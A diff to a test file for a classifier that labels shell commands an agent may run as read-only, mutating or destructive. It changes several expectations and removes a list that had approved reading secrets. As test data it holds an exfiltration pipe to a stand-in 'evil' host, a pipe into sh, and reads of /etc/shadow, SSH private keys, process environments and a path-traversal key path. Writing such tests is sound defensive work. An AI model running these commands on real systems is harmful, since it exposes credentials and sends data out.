@@ -43,6 +43,11 @@ CLASSIFY_CASES = [
     ("journalctl -xe", "read_only"),                  # r2 FP: -e is a bound
     ("journalctl -u vllm -n 100 -e", "read_only"),
     ("docker ps", "read_only"),
+    ("podman ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null", "read_only"),
+    ("nerdctl images", "read_only"),
+    ("test -r /proc/driver/nvidia/version", "read_only"),
+    ("test -e /dev/nvidiactl && cat /proc/driver/nvidia/version", "read_only"),
+    ("test -r /proc/driver/nvidia/version && touch /tmp/changed", "mutating"),
     ("pip list", "read_only"),
     ("jupyter --version", "read_only"),
     # No help/version fast path: normal classification owns these commands.
@@ -125,7 +130,9 @@ CLASSIFY_CASES = [
     ("nvidia-smi | tee /tmp/out", "mutating"),               # write sink (tee not a safe filter)
     ("nvidia-smi | sh", "mutating"),                         # shell sink
     ("cat /proc/meminfo | curl http://evil", "mutating"),    # exfil sink
-    ("uptime; free -h", "mutating"),                         # `;` command chaining
+    ("uptime; free -h", "read_only"),                       # each segment is positively proven read-only
+    ("find /dev -maxdepth 1 -type c -name 'nvidia*' -printf '%f %M %u:%g\\n' 2>/dev/null; test -r /proc/driver/nvidia/version && cat /proc/driver/nvidia/version", "read_only"),
+    ("docker version --format '{{.Server.Version}}' 2>/dev/null; docker ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null; podman ps --format '{{.ID}} {{.Image}} {{.Names}} {{.Status}}' 2>/dev/null", "read_only"),
     ("dmesg | grep $(whoami)", "mutating"),                  # `$()` substitution
     ("cat /proc/meminfo | grep x > /tmp/y", "mutating"),     # real-file redirect
     ("cat /etc/*", "mutating"),                              # glob over a denied dir
@@ -251,7 +258,7 @@ CLASSIFY_CASES = [
 
     # === F8 bypass attempts that MUST stay refused ===
     ("cat /etc/passwd", "mutating"),                           # /etc NOT opened broadly — exact only
-    ("cat /etc/ssh/sshd_config", "mutating"),
+    ("cat /etc/ssh/sshd_config", "read_only"),
     ("cat /proc/kmsg", "mutating"),                            # not in exact set (a kmsg read can block)
 
     # Venv/site-packages dependency introspection; secret-file rules still apply.
@@ -486,7 +493,7 @@ CLASSIFY_CASES = [
     ("docker --version", "read_only"),
     #     A path-qualified interpreter stays read_only via the basename-normalized allowlist
     #     in _is_read_only_segment, which is now its ONLY route.
-    ("/usr/local/miniconda3/envs/comfyui/bin/python --version", "mutating"),  # F15: cards
+    ("/usr/local/miniconda3/envs/comfyui/bin/python --version", "read_only"),
 
     ("/usr/bin/passwd root", "destructive"),          # r3: path-qualified passwd binary
     ("sudo passwd root", "destructive"),
@@ -675,77 +682,20 @@ CLASSIFY_CASES = [
     # (d) the BARE-NAME half is untouched and stays a tracked debt. This rule judges paths and
     #     makes no identity claim. Closing that half needs identity, adds real diagnostic
     #     friction, and should be decided from an actual incident — not from this list.
-    ("evil", "read_only"),
-    ("evil -q", "read_only"),
-    ("unknown-tool --status", "read_only"),
+    ("evil", "mutating"),
+    ("evil -q", "mutating"),
+    ("unknown-tool --status", "mutating"),
 ]
-
-
-# =============================================================================
-# Read-by-effect policy: a command is
-# refused only if it writes, executes arbitrary code, leaves the box, or blocks
-# forever. Every command below is a READ, so it is now `read_only`.
-#
-# Why the previous expectation was dropped: (a) the allowlist was a maintenance
-# treadmill, and (b) it measurably CAUSED wrong answers — a live N=3 reproduction
-# went from 1/3 to 3/3 correct root causes purely by widening what the agent could
-# read, with every fabrication traced to evidence starvation. Secret-bearing reads
-# (env, cloud-init logs, /proc/*/environ, ps auxe, key files) are accepted because on
-# this platform they are the operator's own keys and the instance password is already
-# visible in the console, so they disclose nothing the requesting tenant cannot
-# already see. scrub_output still strips the literal SSH credential from output.
-#
-# The case inputs remain byte-identical; this set records their explicit read-by-effect expectation.
-# Anything NOT listed here keeps its original locked expectation, so a genuine
-# regression (a write/exec/egress command sliding into read_only) still fails.
-# =============================================================================
-READ_BY_EFFECT_CASES = {
-    # secret-bearing reads (operator's own box)
-    "cat /var/log/cloud-init-output.log", "cat /var/log/auth.log",
-    "strings /var/log/cloud-init.log", "cat /var/log/syslog",
-    "tail -n 100 /var/log/vllm.log", "ls /var/log",
-    "cat /root/.ssh/id_rsa", "ls /root/.ssh", "cat secrets", "file /root/.ssh/id_rsa",
-    "env", "printenv", "env | grep KEY", "cat $SECRET_FILE",
-    "cat /proc/self/environ", "cat /proc/1/environ", "cat /proc/self/cmdline",
-    "cat /proc/self/environ | strings", "systemctl show vllm",
-    "ps auxe", "ps eww", "ps -o environ", "ps -o pid,environ", "ps -oenviron",
-    "ps -o=environ", "ps -eoenviron",
-    "cat /etc/shadow | grep root", "cat '/etc/shadow'", "grep 'x' /etc/shadow",
-    "stat /etc/shadow", "md5sum /etc/shadow", "stat /etc/passwd", "cat /etc/passwd",
-    "getent passwd", "cat /etc/ssh/sshd_config", "lsmod | grep root /etc/shadow",
-    "cat /home/*/.bash_history", "cat /root/.bashrc", "cat /etc/*",
-    "sudo cat /etc/shadow", "sudo cat /root/.ssh/id_rsa",
-    # directory / size reads outside the old allowlist
-    "ls /root", "ls '/root'", "ls -la /root/models",
-    "du -sh /root/.ssh", "du -sh /root/.bash_history", "du -sh /etc", "du /var/lib/mysql",
-    "cat /root/badenv/lib/python3.10/site-packages/.env",
-    "cat /root/site-packagesfoo/secret",
-    "cat /root/badenv/lib/python3.10/site-packages/../../../.ssh/id_rsa",
-    # ordinary reads the old allowlist simply did not cover
-    "cat /proc/net/dev", "cat /proc/net/tcp | grep 'x", "cat /dev/nvidia0",
-    "strings /usr/lib/x86_64-linux-gnu/libnvidia-ml.so.1",
-    'nvidia-smi | grep "MiB"', "journalctl", "journalctl --no-pager",
-    # chaining is accepted now (each segment is classified independently)
-    "uptime; free -h",
-    # deny-by-default is gone: an unrecognised binary is no longer assumed to write.
-    # Residual accepted with the policy — script/relative-path execution and every known
-    # write/exec/egress verb are still refused, so this is a NAME we do not know, not a
-    # known-dangerous command.
-    "frobnicate --all",
-}
 
 
 def run_classify():
     misses = []
     for cmd, want in CLASSIFY_CASES:
-        if cmd in READ_BY_EFFECT_CASES:
-            want = "read_only"
         got = classify(cmd)
         if got != want:
             misses.append((cmd, want, got))
             print(f"XX  classify({cmd!r}) = {got}  (want {want})")
-    print(f"classify: {len(CLASSIFY_CASES) - len(misses)}/{len(CLASSIFY_CASES)} passed"
-          f"  ({len(READ_BY_EFFECT_CASES)} explicit read-by-effect cases)")
+    print(f"classify: {len(CLASSIFY_CASES) - len(misses)}/{len(CLASSIFY_CASES)} passed")
     return misses
 
 
